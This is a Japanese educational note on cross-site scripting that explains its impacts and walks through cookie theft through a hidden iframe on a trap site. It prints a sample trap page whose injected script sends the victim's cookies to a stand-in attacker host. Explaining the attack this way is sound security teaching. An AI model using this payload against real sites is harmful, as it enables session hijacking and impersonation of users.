---
title: "XSS（クロスサイト・スクリプティング）"
---

- **ユーザーが Web ページにアクセスすることで不正なスクリプトが実行されてしまう脆弱性または攻撃手法**
- Web アプリケーションには外部からの入力などに応じて表示が変化する箇所がある
- この部分の HTML 生成の実装に問題があると、XSS という脆弱性が生じる
- XSS 脆弱性の影響は
  - サイト利用者のブラウザ上で、攻撃者の用意したスクリプトの実行によりクッキー値を盗まれ、利用者が成りすまし被害に遭う
  - 同じくブラウザ上でスクリプトを実行させられ、サイト利用者の権限で Web アプリケーションの機能を悪用される
  - Web サイト上に偽の入力フォームが表示され、フィッシングにより利用者が個人情報を盗まれる

![](https://storage.googleapis.com/zenn-user-upload/e6fb830f72ae-20231224.png)

## 攻撃手法と影響

### XSS によるクッキー値の盗み出し

攻撃者が悪意のあるスクリプトを Web ページに注入し、そのページを閲覧するユーザーのクッキーを盗み出す。
罠サイトで `<iframe />` を使用した場合の例は以下の通り。

1. **罠サイトの作成**
   - 攻撃者は罠サイトを作成する
   - このサイトは、見た目や内容が魅力的であり、ユーザを誘引するよう設計されている
2. **`<iframe />` を用いた脆弱なサイトの埋め込み**
   - 罠サイトには、XSS 脆弱性を持つ Web サイトのページを `<iframe />` で埋め込む
   - この `src` 属性には、XSS 攻撃を実行するための悪意あるスクリプトを含む URL が指定される
3. **悪意あるスクリプトの実行**
   - ユーザが罠サイトに訪れると、`<iframe />` 内で脆弱なサイトのページが読み込まれ、埋め込まれた XSS コードが実行される
4. **クッキーの盗取**
   - 埋め込まれた XSS スクリプトは、ユーザのブラウザ上で実行され、その結果として脆弱なサイトのユーザークッキーが盗み出される

攻撃者は以下のような HTML コードを含む罠サイトを作成する。

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Special Offer</title>
  </head>
  <body>
    <h1>Click here for a special offer!</h1>
    <iframe
      style="display:none;"
      src="http://vulnerable-website.com/page?param=<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker-website.com/steal-cookie?cookie=' + encodeURIComponent(document.cookie), true); xhr.send();</script>"
    ></iframe>
  </body>
</html>
```

この例では、攻撃者は以下のことを行なっている。

- `<iframe />` を使用して、脆弱なサイト（`vulnerable-website.com`）のページを隠しフレームとして埋め込む
- `<iframe />` の `src` 属性には、脆弱なサイトの URL と、悪意あるスクリプトを含むクエリパラメータが含まれている
- 悪意あるスクリプトは、ユーザのクッキーを読み取り、それを攻撃者のサイト（`attacker-website.com`）に送信する

### その他の JavaScript による攻撃
